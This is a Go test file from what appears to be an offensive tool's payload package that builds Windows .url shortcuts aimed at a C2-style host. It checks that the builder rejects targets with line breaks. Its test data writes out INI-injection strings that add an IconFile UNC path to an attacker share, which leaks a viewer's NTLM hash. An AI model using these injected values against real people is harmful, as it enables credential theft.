package payload

import (
	"bytes"
	"testing"
)

// TestBuildURLShortcutRejectsKeyInjection pins the fix for an INI-injection primitive: a .url file
// is an INI document, so a target carrying a line break adds KEYS. The dangerous one is IconFile:
// Explorer fetches it when the file is viewed, so a UNC path there hands the operator's NTLM hash
// to the attacker just by looking at the shortcut they were sent.
func TestBuildURLShortcutRejectsKeyInjection(t *testing.T) {
	bad := []string{
		"http://x\r\nIconFile=\\\\attacker\\share\\i.ico\r\nIconIndex=0",
		"http://x\nIconFile=\\\\attacker\\share\\i.ico",
		"http://x\rIconFile=\\\\attacker\\share\\i.ico",
		"",
		"   ",
		"not-a-url",
	}
	for _, target := range bad {
		if _, err := BuildURLShortcut(target); err == nil {
			t.Fatalf("BuildURLShortcut(%q) accepted an injectable target", target)
		}
	}

	out, err := BuildURLShortcut("https://c2.example/p")
	if err != nil {
		t.Fatalf("valid target refused: %v", err)
	}
	if !bytes.Contains(out, []byte("URL=https://c2.example/p\r\n")) {
		t.Fatalf("shortcut body lost the URL: %q", out)
	}
	// Two breaks: section header -> URL, and the terminator after it. A third would mean an
	// injected key.
	if n := bytes.Count(out, []byte("\r\n")); n != 2 {
		t.Fatalf("shortcut has %d line breaks, want 2 (header, terminator): %q", n, out)
	}
}
